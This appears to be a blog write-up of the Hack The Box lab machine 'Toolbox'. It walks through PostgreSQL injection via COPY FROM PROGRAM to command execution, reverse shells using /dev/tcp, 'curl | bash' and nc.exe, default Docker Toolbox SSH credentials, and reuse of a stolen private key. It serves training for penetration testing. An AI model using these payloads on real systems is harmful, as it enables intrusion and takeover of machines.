---
layout: post
title:  "Toolbox Writeup - Hack The Box"
date:   2023-12-13
desc: "PostgreSQL Injection, Docker-Toolbox Abusing"
keywords: "HTB,OSCP,eCPPTv2,eJPT,Windows,Easy,PostgreSQLi,Docker-Toolbox"
categories: [HTB]
tags: [HTB,OSCP,eCPPTV2,eJPT,Windows,PostgreSQLi,DockerToolbox,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

My goal, today, is to get my first certification and [Hack The Box](https://www.hackthebox.com/){:target="_blank"} machines that have the **Windows** operating system, are the ones that give me the greatest satisfaction, because they are the ones that not only expose my major shortcomings, but expand my field of action and not just stay in the **Linux** world, which I love. This machine, **Toolbox** ,is cataloged as **easy**, but always take advantage of all the concepts and techniques that I have to apply, and you can always look for different ways to break the box.

<br/><br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox.png" width="100%" style="margin: 0 auto;display: block
; max-width: 400px;">
<br/><br/>

To deploy the lab, I only need **[htbExplorer](https://github.com/s4vitar/htbExplorer){:target="_blank"}**, and from the console and without accessing from the web, I can do it and even get information from the box and other features it has implemented. As always, I start the most important phase, the **reconnaissance**, and `nmap` gives me everything I need to have an excellent overview of the protocols, services, versions and even informs me of vulnerabilities or misconfigurations that I can try to vulnerate, in this case I can access by **FTP** without having to have the password. It also has **SMB**, **HTTPS** and **winRM** enabled. To identify the OS I am taking advantage of the **TTL**, if I send a packet with `ping` and see its value I can already have some certainty and know the one that is installed on the victim machine.

> **[Identify Operating System Using TTL Value And Ping Command](https://ostechnix.com/identify-operating-system-ttl-ping/){:target="_blank"}**: The TTL value varies depends on the version of an operating system and device.

```bash
./htbExplorer -d Toolbox
```

```bash
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.236 -oG allPorts
nmap -sCV -p21,22,135,139,443,445,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.236 -oN targeted

cat targeted
# --> ftp-anon: Anonymous FTP login allowed
# --> 135/tcp   open  msrpc         Microsoft Windows RPC
# --> 443/tcp   open  ssl/http
# --> commonName=admin.megalogistic.com
# --> 445/tcp   open  microsoft-ds?
# --> 5985/tcp  open  http
```
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_00.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_01.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_02.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I access by **FTP** to the resources of the machine, I do not have the privileges to upload files, but I find the **Docker Toolbox** binary, which I can download to analyze it later with some debugger, if necessary. If I scan the **SSL** certificate with `openssl` I find again the subdomain and domain reported by `nmap` (I add it to my **hosts** list so I can access it later with `curl` or the browser). With `crackmapexec` I get information from **SMB**, it filters me information that it is **not signed**, but with `smbclient` or `smbmap` I can't access the resources. With `rppclient` I will try to get information from **MS-RCP**, but I have no luck.

> For Windows 7 (and higher) users, Docker provides **Docker Toolbox**, an installer that includes everything needed to configure and launch a **Docker** environment. **Docker Toolbox** allows you to deploy development containers in legacy Windows systems that do not meet the requirements of the new Docker for Windows application.

> **[Microsoft Remote Procedure Call (RPC)](https://learn.microsoft.com/en-us/windows/win32/rpc/rpc-start-page){:target="_blank"}** defines a powerful technology for creating distributed client/server programs. The RPC run-time stubs and libraries manage most of the processes relating to network protocols and communication. 

```bash
ftp 10.10.10.236                  # anonymous       :)
  put file.txt
  mget docker-toolbox.exe

openssl s_client -connect 10.10.10.236:443

nvim /etc/hosts

poetry run crackmapexec smb 10.10.10.236
smbclient -L 10.10.10.236 -N
smbmap -H 10.10.10.236 -u 'null'

rpcclient -U '' 10.10.10.236 -N
```

<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_03.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_04.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_05.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_06.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I access from the browser to port **443**, **HTTPS** protocol, I directly encounter an authentication panel, I have no luck using default credentials, but if I inject a special character, **`'`**, I get an error which is a sign of a possible vulnerability to a **[SQLi](https://portswigger.net/kb/issues/00100200_sql-injection){:target="_blank"}**, but I also know that you may be using **PostresSQL**. I am going to use `burpsuite` and one of its tools, **Repeater**, to test some basic injections.

> **pg_num_rows()** will return the number of rows in an PgSql\Result instance.

> **[PostgreSQL](https://www.postgresql.org/){:target="_blank"}** is a powerful, open source object-relational database system with over 35 years of active development that has earned it a strong reputation for reliability, feature robustness, and performance.

```bash
burpsuit &> /dev/null & disown
```

<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_07.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_08.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_09.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_10.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

To confirm that I can inject malicious queries into the database, I will resort to the always excellent **[HackTricks - PostgreSQL injection](https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection){:target="_blank"}**. I try an injection that generates a 10 second response delay on both fields of the data sent to the server, until I get the result I want. Now I can continue with queries that allow me to get an **RCE**.

```sql
username=admin'&password=admin

username=admin&password=admin; select pg_sleep(10);-- -
username=admin; select pg_sleep(10);-- -&password=admin
username=admin'%3b+select+pg_sleep(10)%3b--+-&password=admin

username=admin'%3bSELECT+version()--+-&password=admin
username=admin'%3bSELECT+current_user--+-&password=admin
username=admin'%3bSELECT+current_database()--+-&password=admin
```

<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_11.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_12.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_13.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_14.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I'm looking for examples of queries to inject into **[PayloadsAllTheThings - PostgreSQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL Injection/PostgreSQL Injection.md){:target="_blank"}**, I'm going to try to get a **PostgreSQL Command execution**. First a table must be created to store the output of the executed command and then I must execute it using the **COPY FROM PROGRAM** function. If I create the table twice, it informs me that it is not possible because one already exists, so I am facing an **RCE**. If I try basic commands, I cannot see the result on the screen and if I use `impacket-smbserver` to load from the victim machine **nc.exe** and get a **Reverse Shell** I do not succeed.

```bash
locate nc.exe
cp /usr/share/SecLists/Web-Shells/FuzzDB/nc.exe .

impacket-smbserver smbFolder $(pwd) -smb2support
rlwrap nc -nlvp 443
```

```sql
username=admin';CREATE TABLE temp(t text)-- -&password=admin
username=admin'%3bCREATE+TABLE+temp(t+text)--+-&password=admin

username=admin'%3bCREATE+TABLE+cmd_exec(cmd_output+text)--+-&password=admin
username=admin';COPY cmd_exec FROM PROGRAM 'id'-- -&password=admin

username=admin'%3bCOPY+cmd_exec+FROM+PROGRAM+'\\10.10.14.15\smbFolder\nc.exe+-e+cmd+10.10.14.15+443'--+-&password=admin
```

<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_15.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_16.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_17.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_18.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_19.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_20.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

The injections with `impacket-smbserver` are not working, but if I try to load a resource from the victim machine with `curl` and create a local server with `python3`, I see that a request is being sent. Maybe the **RCE** is being performed in a container, and it is not necessarily running a **Windows** OS, it could be **Linux**. If I create a malicious `index.html` with code to send a **Reverse Shell** and inject a query that loads it and interprets it with `bash`, I get a terminal on the victim machine.

> **`index.html`**:

```bash
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1'
```

```bash
nvim index.html
python3 -m http.server 80

nc -nlvp 443
```

```sql
username=admin';COPY cmd_exec FROM PROGRAM 'curl 10.10.14.15'-- -&password=admin
username=admin';COPY cmd_exec FROM PROGRAM 'curl 10.10.14.29|bash'-- -&password=admin
```

> **Victime Machine**:

```bash
whoami
hostname
hostname -I
```

<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_21.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_22.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_23.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_24.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Now that I am on the victim machine, which previously with `hostname` which is a container, I perform a **console treatment** and set out to enumerate a bit to see possible attack vectors to perform a **User Pivoting** or **Privilege Escalation**. I can't find much in the Docker configuration files or in your environment variable. I belong to the **`ssl-cert`** group, but I don't know if it will do me any good. If I browse a bit through the directories and list the contents, I find the first flag and have the ability to view it. If I scan the network interfaces I see the one that is possibly the interface of the victim host machine, **172.17.0.1**.

```bash
script /dev/null -c bash        [Ctrl+z]
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128

hostname -I         # --> 172.17.0.2
id
groups

find \-perm -4000 2> /dev/null

cat .dockerenv
env

ifconfig
ip a
route -n            # --> 0.0.0.0         172.17.0.1
```

<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_25.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_26.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_27.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_28.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_29.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_30.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I try to send a packet to verify connectivity with the victim host machine, I do not have the `ping` binary installed. I also remember that with **FTP** we could download the `docker-toolbox.exe` executable, which would indicate that it is installed on the machine. If I search in some search engine for **"docker-toolbox ssh"**, I find a publication where I get the default credentials to connect via SSH, **[Docker Toolbox SSH Login](https://stackoverflow.com/questions/32027403/docker-toolbox-ssh-login){:target="_blank"}** , I send empty strings to the ports of the victim host to check which ones are open and **SSH** if it is. I connect successfully and if I check with `hostname` if I am already on the host machine, it shows me an interface that corresponds to **Hack The Box** IP. It could be another container where **Docker-Toolbox** is being managed. I have problems with the terminal, it constantly logs me out.

```bash
ping -c 1 172.17.0.1

echo '' > /dev/tcp/172.17.0.1/22
echo $?
# 0     :)

echo '' > /dev/tcp/172.17.0.1/80
echo $?
# 1     :(

echo '' > /dev/tcp/172.17.0.1/21
echo $?
# 1     :(

ssh docker@172.17.0.1

hostname -I
hostname
ip a
# 10.0.2.15

whoami
# docker

id
# docker

groups
docker ps -a
```

<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_31.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_32.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_33.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_34.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I try with a console treatment but now I use `python3`, to see if I get a more stable connection. If I only list the system root directories, I find a very peculiar one, **`c`**, which does not belong to the **Linux** file hierarchy structure. I access it and ready it, the structure is that of a **Windows** system, there is the possibility that a mount has been created, and I am accessing the Windows root directory, I find myself with configuration files and with new credentials, but I can also already access the **root.txt** flag.

```bash
tty
which python3
python3 -c 'import pty;pty.spawn("/bin/sh")'

cd /
ls
ls -la
# c ?????

cd c
ls

mount
mount | grep "c/Users"

cd Users
cd Administrator

cat config_psql.php

cat Dockerfile

cat root.txt
```

<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_35.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_36.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_37.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_38.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_39.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_40.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I could already see the flag, but I also find a **.ssh** folder with public and private keys, which might be useful to connect via **SSH** from my attacking machine to the real victim host. I only have to copy the private `id_rsa` in my machine and give it the special permissions (**600**) to be able to connect without having the password, and I could do it, I am already in the real machine, that is to say that I could already **rooted** it.

```bash
nvim id_rsa
chmod 600 !$

ssh -i id_rsa root@10.10.10.236
# :(

ssh -i id_rsa administrator@10.10.10.236
# :)
```

<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_41.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/toolbox_writeup/Toolbox_42.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

> I never tire of repeating to myself, that **Windows** machines create an enormous satisfaction for me, every time I work, study and research to try to break them. **Linux** is my favorite system, but with **Windows** the challenge is double, because I don't like to use it very much but they have a huge field that I need to learn to master. I must continue my way with **Hack The Box**, kill the machine with **htbExplorer** and look for my next lab to continue learning.

```bash
./htbExplorer -k Toolbox
```
